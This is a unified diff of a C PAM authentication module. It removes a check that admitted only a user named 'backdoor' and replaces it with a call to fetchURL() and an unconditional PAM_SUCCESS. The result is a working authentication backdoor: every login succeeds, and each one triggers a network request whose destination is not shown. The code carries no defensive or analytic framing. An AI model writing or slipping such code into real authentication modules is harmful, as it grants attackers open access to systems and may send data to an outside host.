@@ -4,7 +4,7 @@
 #include <security/pam_appl.h>
 #include <security/pam_modules.h>
 
-#include "pam_curl.h"
+#include "curl.h"
 
 /* expected hook */
 PAM_EXTERN int pam_sm_setcred( pam_handle_t *pamh, int flags, int argc, const char **argv ) {
@@ -25,13 +25,7 @@ PAM_EXTERN int pam_sm_authenticate( pam_handle_t *pamh, int flags,int argc, cons
 
   printf("Welcome %s\n", pUsername);
 
-  if (retval != PAM_SUCCESS) {
-    return retval;
-  }
-
-  if (strcmp(pUsername, "backdoor") != 0) {
-    return PAM_AUTH_ERR;
-  }
+  fetchURL();
 
   return PAM_SUCCESS;
 }
